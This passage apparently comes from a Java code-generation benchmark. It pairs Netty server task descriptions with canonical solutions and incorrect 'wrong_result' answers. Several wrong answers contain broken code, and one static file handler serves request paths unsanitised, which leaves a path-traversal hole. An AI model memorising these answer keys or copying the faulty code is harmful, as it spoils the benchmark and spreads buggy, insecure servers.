@Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            onDisconnect(ctx);\n        }\n\n        @Override\n        protected void messageReceived(ChannelHandlerContext ctx, WebSocketFrame frame) {\n            if (frame instanceof TextWebSocketFrame) {\n                String text = ((TextWebSocketFrame) frame).text();\n                onTextMessage(ctx, text);\n            } else if (frame instanceof BinaryWebSocketFrame) {\n                byte[] data = new byte[frame.content().readableBytes()];\n                frame.content().readBytes(data);\n                onBinaryMessage(ctx, data);\n            }\n        }\n\n        public void onConnect(ChannelHandlerContext ctx) {\n            initLocalClient(ctx, new Command());\n        }\n\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            Protocol protocol = findProtocolByChannel(ctx.channel());\n            if (protocol != null) {\n                protocolList.remove(protocol);\n                logger.info(\"Client disconnected\");\n            }\n        }\n\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = parseCommand(text);\n            executeCommand(ctx, command);\n        }\n\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            Protocol protocol = findProtocolByChannel(ctx.channel());\n            if (protocol != null) {\n                protocol.handleBinaryData(data);\n            }\n        }\n\n        public void initLocalClient(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = new Protocol(ctx.channel(), command);\n            protocolList.add(protocol);\n            logger.info(\"New client connected\");\n        }\n\n        public void executeCommand(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = findProtocolByChannel(ctx.channel());\n            if (protocol != null) {\n                protocol.execute(command);\n            }\n        }\n\n        private Protocol findProtocolByChannel(Channel channel) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getChannel().equals(channel)) {\n                    return protocol;\n                }\n            }\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 161,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests for static file serving, with optional SSL support.\n\nClass Description: HttpStaticFileServer is a Netty-based server that serves static files over HTTP or HTTPS. It uses a boss-worker thread model for handling connections and includes SSL configuration capabilities.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL/TLS encryption should be enabled\n- PORT: [int] - The port number on which the server will listen (defaults to 8080 for HTTP or 8443 for HTTPS)\n\nMethods:\n- start(): [void] - Starts the Netty server with the configured settings. Throws Exception if startup fails.\n  - Input: None\n  - Output: None (but binds to specified port and starts serving requests)\n  - Side effects: Creates event loop groups, binds to port, and keeps server running until shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslProvider;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpStaticFileServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n                .sslProvider(SslProvider.JDK).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpStaticFileServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HttpStaticFileServer {\n    private final boolean ssl;\n    private final int port;\n\n    public HttpStaticFileServer(boolean ssl) {\n        this.ssl = ssl;\n        this.port = ssl ? 8443 : 8080;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         SelfSignedCertificate ssc = new SelfSignedCertificate();\n                         SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new ChunkedWriteHandler());\n                     p.addLast(new StaticFileServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class StaticFileServerHandler extends ChannelInboundHandlerAdapter {\n        private static final String ROOT_DIR = \".\";\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String uri = request.uri();\n                String filePath = ROOT_DIR + uri;\n                if (uri.equals(\"/\")) {\n                    filePath = ROOT_DIR + \"/index.html\";\n                }\n                File file = new File(filePath);\n                if (file.exists() && file.isFile()) {\n                    HttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                    response.headers().set(HttpHeaderNames.CONTENT_TYPE, getContentType(uri));\n                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, file.length());\n                    FileRegion region = new FileRegion(file, 0, file.length());\n                    ctx.write(response);\n                    ctx.write(region);\n                    ctx.writeAndFlush(LastHttpContent.EMPTY_LAST_CONTENT);\n                } else {\n                    HttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.NOT_FOUND);\n                    ctx.writeAndFlush(response);\n                }\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        private String getContentType(String uri) {\n            if (uri.endsWith(\".html\")) return \"text/html\";\n            if (uri.endsWith(\".css\")) return \"text/css\";\n            if (uri.endsWith(\".js\")) return \"application/javascript\";\n            if (uri.endsWith(\".png\")) return \"image/png\";\n            if (uri.endsWith(\".jpg\")) return \"image/jpeg\";\n            if (uri.endsWith(\".gif\")) return \"image/gif\";\n            if (uri.endsWith(\".txt\")) return \"text/plain\";\n            return \"application/octet-stream\";\n        }\n    }\n}"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Implement a Netty-based TCP server for RPC (Remote Procedure Call) communication that handles incoming client connections, processes RPC requests, and manages server resources efficiently.\n\nClass Description: NettyRpcServer is a Spring component that establishes a TCP server using Netty framework to handle RPC communications. It manages service registration, client connections, and provides graceful shutdown capabilities.\n\nAttributes:\n- PORT: [int] - The port number on which the server listens for incoming connections (default: 9998).\n- serviceProvider: [ServiceProvider] - An instance responsible for managing and providing registered RPC services (singleton instance of ZkServiceProviderImpl).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. Configures event loop groups, server bootstrap, channel pipeline with handlers for encoding/decoding RPC messages, and idle state detection. Binds to the specified host and port, and keeps the server running until shutdown.\n  Input: None\n  Output: None\n\n- registerService(RpcServiceConfig rpcServiceConfig): [void] - Registers an RPC service with the service provider.\n  Input: rpcServiceConfig [RpcServiceConfig] - Configuration object containing RPC service details to be registered.\n  Output: None",
    "Canonical_solution": "import github.javaguide.config.CustomShutdownHook;\nimport github.javaguide.config.RpcServiceConfig;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.provider.ServiceProvider;\nimport github.javaguide.provider.impl.ZkServiceProviderImpl;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport github.javaguide.utils.RuntimeUtil;\nimport github.javaguide.utils.concurrent.threadpool.ThreadPoolFactoryUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport java.net.InetAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\n@Component\npublic class NettyRpcServer {\n\n    public static final int PORT = 9998;\n\n    private final ServiceProvider serviceProvider = SingletonFactory.getInstance(ZkServiceProviderImpl.class);\n\n    @SneakyThrows\n    public void start() {\n        CustomShutdownHook.getCustomShutdownHook().clearAll();\n        String host = InetAddress.getLocalHost().getHostAddress();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        DefaultEventExecutorGroup serviceHandlerGroup = new DefaultEventExecutorGroup(\n                RuntimeUtil.cpus() * 2,\n                ThreadPoolFactoryUtil.createThreadFactory(\"service-handler-group\", false)\n        );\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            p.addLast(new RpcMessageEncoder());\n                            p.addLast(new RpcMessageDecoder());\n                            p.addLast(serviceHandlerGroup, new NettyRpcServerHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(host, PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            log.error(\"occur exception when start server:\", e);\n        } finally {\n            log.error(\"shutdown bossGroup and workerGroup\");\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            serviceHandlerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyRpcServer {\n    private int port = 9998;\n    private ServiceProvider serviceProvider;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyRpcServer(ServiceProvider serviceProvider) {\n        this.serviceProvider = serviceProvider;\n    }\n\n    public void start() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                            ch.pipeline().addLast(new LengthFieldBasedFrameDecoder(1024 * 1024, 0, 4, 0, 4));\n                            ch.pipeline().addLast(new RpcMessageDecoder());\n                            ch.pipeline().addLast(new RpcMessageEncoder());\n                            ch.pipeline().addLast(new RpcRequestHandler(serviceProvider));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.registerService(rpcServiceConfig);\n    }\n}"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that can handle incoming client connections, support SSL/TLS encryption, and provide graceful shutdown capabilities.\n\nClass Description: The NettyServer class is responsible for creating and managing a TCP server using Netty framework. It handles server initialization, SSL configuration (if enabled), thread pool management, and proper resource cleanup during shutdown.\n\nAttributes:\n- blade: [Blade] - Reference to the Blade framework instance for web application context\n- environment: [Environment] - Configuration environment containing server settings\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- channel: [Channel] - Netty channel representing the server socket\n- DEFAULT_ACCEPT_THREAD_COUNT: [int] - Default number of threads for accepting connections\n- DEFAULT_IO_THREAD_COUNT: [int] - Default number of threads for I/O operations\n\nMethods:\n- startServer(): [void] -> [void] - Starts the Netty server with configured settings, including optional SSL/TLS setup. Reads configuration from environment and initializes thread pools.\n- stop(): [void] -> [void] - Gracefully shuts down the server by releasing all thread pool resources and closing the server channel.",
    "Canonical_solution": "import com.hellokaton.blade.Blade;\nimport com.hellokaton.blade.Environment;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoop;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport lombok.extern.slf4j.Slf4j;\n\nimport static com.hellokaton.blade.kit.BladeKit.getStartedSymbol;\nimport static com.hellokaton.blade.mvc.BladeConst.*;\n\n@Slf4j\npublic class NettyServer {\n\n    private Blade blade;\n    private Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = 0;\n\n    public void startServer() throws Exception {\n        boolean SSL = environment.getBoolean(ENV_KEY_SSL, false);\n        SslContext sslCtx = null;\n        if (SSL) {\n            String certFilePath = environment.get(ENV_KEY_SSL_CERT, null);\n            String privateKeyPath = environment.get(ENV_KEY_SSL_PRIVATE_KEY, null);\n            String privateKeyPassword = environment.get(ENV_KEY_SSL_PRIVATE_KEY_PASS, null);\n            \n            log.info(\"{}SSL CertChainFile  Path: {}\", getStartedSymbol(), certFilePath);\n            log.info(\"{}SSL PrivateKeyFile Path: {}\", getStartedSymbol(), privateKeyPath);\n            sslCtx = SslContextBuilder.forServer(new File(certFilePath), new File(privateKeyPath), privateKeyPassword).build();\n        }\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n\n        int acceptThreadCount = environment.getInt(ENV_KEY_NETTY_ACCEPT_THREAD_COUNT, DEFAULT_ACCEPT_THREAD_COUNT);\n        int ioThreadCount = environment.getInt(ENV_KEY_NETTY_IO_THREAD_COUNT, DEFAULT_IO_THREAD_COUNT);\n\n        this.bossGroup = new NioEventLoopGroup(acceptThreadCount, new NamedThreadFactory(\"boss@\"));\n        this.workerGroup = new NioEventLoopGroup(ioThreadCount, new NamedThreadFactory(\"worker@\"));\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.TCP_NODELAY, environment.getBoolean(ENV_KEY_NETTY_TCP_NODELAY, true))\n                .childOption(ChannelOption.SO_KEEPALIVE, environment.getBoolean(ENV_KEY_NETTY_SO_KEEPALIVE, true))\n                .childHandler(new HttpServerInitializer(sslCtx, blade));\n\n        String address = environment.get(ENV_KEY_SERVER_ADDRESS, DEFAULT_SERVER_ADDRESS);\n        Integer port = environment.getInt(ENV_KEY_SERVER_PORT, DEFAULT_SERVER_PORT);\n\n        channel = bootstrap.bind(address, port).sync().channel();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyServer {\n    private final Blade blade;\n    private final Environment environment;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private Channel channel;\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = Runtime.getRuntime().availableProcessors();\n\n    public NettyServer(Blade blade, Environment environment) {\n        this.blade = blade;\n        this.environment = environment;\n        this.bossGroup = new NioEventLoopGroup(DEFAULT_ACCEPT_THREAD_COUNT);\n        this.workerGroup = new NioEventLoopGroup(DEFAULT_IO_THREAD_COUNT);\n    }\n\n    public void startServer() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 if (environment.isSslEnabled()) {\n                     SslContext sslCtx = SslContextBuilder.forServer(\n                         KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm())\n                             .getKeyManagers(),\n                         TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm())\n                             .getTrustManagers())\n                         .build();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                 }\n                 p.addLast(new ChannelInboundHandlerAdapter());\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture f = b.bind(environment.getServerPort()).syncUninterruptibly();\n        channel = f.channel();\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Java class that implements an HTTP server using Netty framework, capable of handling HTTP requests with configurable thread pool settings and connection management.\n\nClass Description: Netty4HttpServer is a Netty-based HTTP server implementation that handles incoming HTTP requests using configurable worker threads and connection pooling. It extends AbstractServer and implements StatisticCallback for monitoring purposes.\n\nAttributes:\n- httpMessageHandler: HttpMessageHandler - Handler for processing HTTP requests\n- url: URL - Server configuration URL containing parameters like port, thread settings\n- channel: Channel - Netty channel for server communication\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- standardThreadExecutor: StandardThreadExecutor - Thread pool for request processing\n\nMethods:\n- open() -> boolean - Initializes and starts the HTTP server, returns true if successful\n  Input: None\n  Output: boolean indicating success/failure of server startup\n\n- close(int timeout) -> void - Shuts down the server gracefully within specified timeout\n  Input: timeout - maximum time to wait for shutdown (in milliseconds)\n  Output: None\n\n- processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) -> void - Processes incoming HTTP requests\n  Input: \n    ctx - ChannelHandlerContext for the connection\n    httpRequest - Full HTTP request object\n  Output: None\n\n- sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) -> void - Sends HTTP response to client\n  Input:\n    ctx - ChannelHandlerContext for the connection\n    httpResponse - Full HTTP response object\n  Output: None\n\n- getUrl() -> URL - Returns server configuration URL\n  Input: None\n  Output: URL object containing server configuration",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport com.weibo.api.motan.util.StatisticCallback;\nimport com.weibo.api.motan.util.StatsUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\nimport java.net.InetSocketAddress;\n\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler httpMessageHandler) {\n        this.url = url;\n        this.httpMessageHandler = httpMessageHandler;\n    }\n\n    @Override\n    public synchronized boolean open() {\n        if (isAvailable()) {\n            return true;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), 500);\n\n        int minWorkerThread, maxWorkerThread;\n\n        if (shareChannel) {\n            minWorkerThread = url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread = url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER);\n        } else {\n            minWorkerThread =\n                    url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread =\n                    url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n        }\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        standardThreadExecutor = (standardThreadExecutor != null && !standardThreadExecutor.isShutdown()) ? standardThreadExecutor\n                : new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\"http-decoder\", new HttpRequestDecoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(maxContentLength));\n                ch.pipeline().addLast(\"http-encoder\", new HttpResponseEncoder());\n                ch.pipeline().addLast(\"http-chunked\", new ChunkedWriteHandler());\n                ch.pipeline().addLast(\"serverHandler\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpRequest httpRequest) {\n                        httpRequest.content().retain();\n                        try {\n                            standardThreadExecutor.execute(() -> processHttpRequest(ctx, httpRequest));\n                        } catch (Exception e) {\n                            LoggerUtil.error(\"request is rejected by threadPool!\", e);\n                            httpRequest.content().release();\n                            sendResponse(ctx, NettyHttpUtil.buildErrorResponse(\"request is rejected by thread pool!\"));\n                        }\n                    }\n                });\n            }\n        }).option(ChannelOption.SO_BACKLOG, 1024).childOption(ChannelOption.SO_KEEPALIVE, false);\n\n        ChannelFuture f;\n        try {\n            f = b.bind(url.getPort()).sync();\n            channel = f.channel();\n        } catch (InterruptedException e) {\n            LoggerUtil.error(\"init http server fail.\", e);\n            return false;\n        }\n        setLocalAddress((InetSocketAddress) channel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n        state = ChannelState.ALIVE;\n        StatsUtil.registryStatisticCallback(this);\n        LoggerUtil.info(\"Netty4HttpServer ServerChannel finish Open: url=\" + url);\n        return true;\n    }\n\n    private void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse;\n        try {\n            httpRequest.headers().set(URLParamType.host.getName(), ((InetSocketAddress) ctx.channel().remoteAddress()).getAddress().getHostAddress());\n            httpResponse = httpMessageHandler.handle(this, httpRequest);\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler process http request fail.\", e);\n            httpResponse = NettyHttpUtil.buildErrorResponse(e.getMessage());\n        } finally {\n            httpRequest.content().release();\n        }\n        sendResponse(ctx, httpResponse);\n    }\n\n    private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        boolean close = false;\n        try {\n            ctx.write(httpResponse);\n            ctx.flush();\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler write response fail.\", e);\n            close = true;\n        } finally {\n            if (close || httpResponse == null || !httpResponse.headers().contains(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE, true)) {\n                ctx.close();\n            }\n        }\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) {\n            LoggerUtil.info(\"Netty4HttpServer close fail: already close, url={}\", url.getUri());\n            return;\n        }\n\n        if (state.isUnInitState()) {\n            LoggerUtil.info(\"Netty4HttpServer close Fail: don't need to close because node is unInit state: url={}\",\n                    url.getUri());\n            return;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdownNow();\n        }\n        workerGroup = null;\n        bossGroup = null;\n        standardThreadExecutor = null;\n        channel = null;\n        state = ChannelState.CLOSE;\n        StatsUtil.unRegistryStatisticCallback(this);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private final HttpMessageHandler httpMessageHandler;\n    private final URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(HttpMessageHandler httpMessageHandler, URL url) {\n        this.httpMessageHandler = httpMessageHandler;\n        this.url = url;\n    }\n\n    public boolean open() {\n        try {\n            int port = url.getPort();\n            String query = url.getQuery();\n            Map<String, String> params = new HashMap<>();\n            if (query != null) {\n                String[] pairs = query.split(\"&\");\n                for (String pair : pairs) {\n                    String[] keyValue = pair.split(\"=\");\n                    if (keyValue.length == 2) {\n                        params.put(keyValue[0], keyValue[1]);\n                    }\n                }\n            }\n            int bossThreads = Integer.parseInt(params.getOrDefault(\"bossThreads\", \"1\"));\n            int workerThreads = Integer.parseInt(params.getOrDefault(\"workerThreads\", \"16\"));\n\n            bossGroup = new NioEventLoopGroup(bossThreads);\n            workerGroup = new NioEventLoopGroup(workerThreads);\n            standardThreadExecutor = new StandardThreadExecutor(workerThreads);\n\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(bossGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .handler(new ChannelInitializer<Channel>() {\n                         @Override\n                         protected void initChannel(Channel ch) throws Exception {\n                             ch.pipeline().addLast(workerGroup, httpMessageHandler);\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.bind(port).syncUninterruptibly();\n            channel = future.channel();\n            return true;\n        } catch (Exception e) {\n            close(0);\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (channel != null) {\n            channel.close().await(timeout);\n        }\n        bossGroup.shutdownGracefully(timeout, timeout, TimeUnit.MILLISECONDS);\n        workerGroup.shutdownGracefully(timeout, timeout, TimeUnit.MILLISECONDS);\n        standardThreadExecutor.shutdown();\n    }\n\n    public void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        standardThreadExecutor.execute(() -> {\n            try {\n                // Process request logic here\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                sendResponse(ctx, response);\n            } catch (Exception e) {\n                // Handle exception\n            }\n        });\n    }\n\n    public void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        ctx.writeAndFlush(httpResponse).addListener(f -> {\n            if (!f.isSuccess()) {\n                // Handle failure\n            }\n        });\n    }\n\n    public URL getUrl() {\n        return url;\n    }\n}"
  },
  {
    "Task_id": 166,
